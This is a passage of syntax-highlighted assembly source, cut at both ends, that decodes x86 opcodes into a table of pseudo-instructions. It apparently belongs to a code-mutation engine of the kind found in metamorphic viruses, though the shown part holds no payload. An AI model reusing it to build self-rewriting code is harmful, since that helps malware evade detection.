                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@GenericOpcode2</span><span class="sc0">
       </span><span class="sc5">@@SigueInstr_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">        </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_8b_MemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">        </span><span class="sc1">; TEST</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_32b_MemReg</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 86h        ; XCHG</span><span class="sc0">
</span><span class="sc1">;                 jz    @@Gen_8b_MemReg</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 87h        ; XCHG</span><span class="sc0">
</span><span class="sc1">;                 jz    @@Gen_32b_MemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc0">        </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@GenericOpcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc0">        </span><span class="sc1">; LEA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">        </span><span class="sc1">; POP Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@POPMem</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">; NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NOP</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 97h      ; Disabled instructions</span><span class="sc0">
</span><span class="sc1">;                 jbe   @@XCHGWithEAX</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0A0h</span><span class="sc0">
</span><span class="sc1">;                 jz    @@MOVALMem</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0A1h</span><span class="sc0">
</span><span class="sc1">;                 jz    @@MOVEAXMem</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0A2h</span><span class="sc0">
</span><span class="sc1">;                 jz    @@MOVMemAL</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0A3h</span><span class="sc0">
</span><span class="sc1">;                 jz    @@MOVMemEAX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0">       </span><span class="sc1">; TEST AL,xx?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TESTALValue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0">       </span><span class="sc1">; TEST EAX,xx?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TESTEAXValue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">       </span><span class="sc1">; MOV Reg8,xx?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@SigueInstr_02</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@MOVReg8Value</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0">       </span><span class="sc1">; MOV Reg,xxx?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@MOVRegValue</span><span class="sc0">
       </span><span class="sc5">@@SigueInstr_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; SHIFT,1? (ROL,ROR,etc. with 8 bits)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@BitShifting8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc0">       </span><span class="sc1">; SHIFT,1 with 32 bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@BitShifting32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">       </span><span class="sc1">; RET?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RET</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">       </span><span class="sc1">; MOV Mem8,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMem8Value</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">       </span><span class="sc1">; MOV Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMem32Value</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">       </span><span class="sc1">; SHIFT,x with 8 bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@BitShifting8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0">       </span><span class="sc1">; SHIFT,x with 32 bits?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@BitShifting32</span><span class="sc0">

        </span><span class="sc1">;; In this gap there are obsolete instructions, copro ones and</span><span class="sc0">
        </span><span class="sc1">;; other that we aren't going to use (for the moment), so decode</span><span class="sc0">
        </span><span class="sc1">;; them it's not worthy.</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">       </span><span class="sc1">; CALL?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CALL</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">       </span><span class="sc1">; Long JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">       </span><span class="sc1">; Short JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMP8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc0">       </span><span class="sc1">; CMC?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">       </span><span class="sc1">; NOT and NEG?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SomeNotVeryCommon8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SomeNotVeryCommon32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc0">   </span><span class="sc1">; One-byters that have not been decoded</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@NOP</span><span class="sc0">         </span><span class="sc1">; are set as NOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">       </span><span class="sc1">; INC/DEC Mem8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCDECMem8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; INC/DEC/PUSH Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCDECPUSHMem32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Set NOP if any instruction hasn't</span><span class="sc0">
     </span><span class="sc5">@@SetOneByteInstruction</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; fit the conditions above</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">; Increase the storadge EIP and the</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; disassembly EIP by 1</span><span class="sc0">
     </span><span class="sc5">@@ContinueDissasembly</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopTrace</span><span class="sc0">       </span><span class="sc1">; Treat next instruction</span><span class="sc0">

</span><span class="sc1">;;;; GENERIC OPCODE</span><span class="sc0">
</span><span class="sc1">; This kind of construction is very common among the opcodes. This is the way</span><span class="sc0">
</span><span class="sc1">; Intel codes the instructions that uses the Reg,Reg, Mem,Reg and Reg,Mem</span><span class="sc0">
</span><span class="sc1">; operands. The operations coded under this ones are ADD, OR, ADC, SBB, AND,</span><span class="sc0">
</span><span class="sc1">; SUB, XOR and CMP.</span><span class="sc0">
     </span><span class="sc5">@@GenericOpcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">     </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; Check the type of instruction. If it's</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Gen_NormalOpcode</span><span class="sc0">  </span><span class="sc1">; Mem,Reg, Reg,Mem or Reg,Reg, jump.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">; Check if it's an OP with AL</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_UsingAL</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">; Check if it's an OP with EAX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_UsingEAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if the opcode is 0F, the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; that is used for some extended operations</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Opcode0F</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetOneByteInstruction</span><span class="sc0"> </span><span class="sc1">; Set the instruction.</span><span class="sc0">

        </span><span class="sc5">@@Gen_NormalOpcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Check Mem8,Reg8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_8b_MemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; Check Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_32b_MemReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; Check Reg8,Mem8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_8b_RegMem</span><span class="sc0">

        </span><span class="sc5">@@Gen_32b_RegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">  </span><span class="sc1">; Check Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_32b_ReglReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc0">         </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen_32b_RegMem_0</span><span class="sc0"> </span><span class="sc1">; If it isn't MOV, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Set MOV Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">       </span><span class="sc1">; Jump to decode the instruction</span><span class="sc0">
        </span><span class="sc5">@@Gen_32b_RegMem_0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">         </span><span class="sc1">; Get the operation in pseudo-asm</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Set the "Reg,Mem" mode</span><span class="sc0">
        </span><span class="sc5">@@Gen_GenMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the data around the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">  </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the data of the x86 opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">         </span><span class="sc1">; Get the register involved</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Store it at +7 in the pseudo-instr.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; Set in EDX the offset of the memory</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; construction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0"> </span><span class="sc1">; Decode it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; Add the length of the memory field</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; to ESI</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

        </span><span class="sc5">@@Gen_32b_MemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the second opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Check if it's Reg,Reg operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_32b_lRegReg</span><span class="sc0"> </span><span class="sc1">; If it is, jump to decode it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">       </span><span class="sc1">; Check if it's TEST</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen_32b_MemReg_0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; If it is, store a TEST opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">
        </span><span class="sc5">@@Gen_32b_MemReg_0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 87h     ; This is XCHG, but we aren't using</span><span class="sc0">
</span><span class="sc1">;                 jnz   @@Gen_32b_MemReg_1 ; it, so it's disabled.</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 48h+6</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@Gen_GenMem</span><span class="sc0">
        </span><span class="sc5">@@Gen_32b_MemReg_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc0">       </span><span class="sc1">; Check if it's MOV Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen_32b_MemReg_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; Set MOV Mem,Reg if it is</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">
        </span><span class="sc5">@@Gen_32b_MemReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Get the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">     </span><span class="sc1">; Jump to set it and decode the rest</span><span class="sc0">

        </span><span class="sc5">@@Gen_32b_ReglReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenOp_SetRegReg</span><span class="sc0"> </span><span class="sc1">; Decode the Reg,Reg instruction</span><span class="sc0">
        </span><span class="sc5">@@Gen_GenReglReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the source register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it on the disassembly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the destiny register and set it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

        </span><span class="sc5">@@Gen_32b_lRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenOp_SetRegReg</span><span class="sc0"> </span><span class="sc1">; Decode the Reg,Reg instruction</span><span class="sc0">
        </span><span class="sc5">@@Gen_GenlRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the registers and store them in</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; their appropiated fields</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
